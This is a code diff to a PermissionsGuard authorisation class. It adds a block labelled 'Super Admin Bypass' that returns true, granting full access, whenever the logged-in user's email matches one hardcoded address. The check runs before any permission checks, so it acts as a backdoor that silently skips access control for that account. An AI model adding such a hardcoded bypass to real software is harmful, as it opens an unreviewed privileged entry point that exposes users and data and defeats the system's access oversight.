@@ -23,6 +23,11 @@ export class PermissionsGuard implements CanActivate {
             throw new ForbiddenException('Authentication required');
         }
 
+        // Super Admin Bypass
+        if (user.email === 'j.molina@runsolutions-services.com') {
+            return true;
+        }
+
         // Check basic permissions (legacy support)
         const requiredPermissions = this.reflector.get<string[]>(
             'permissions',
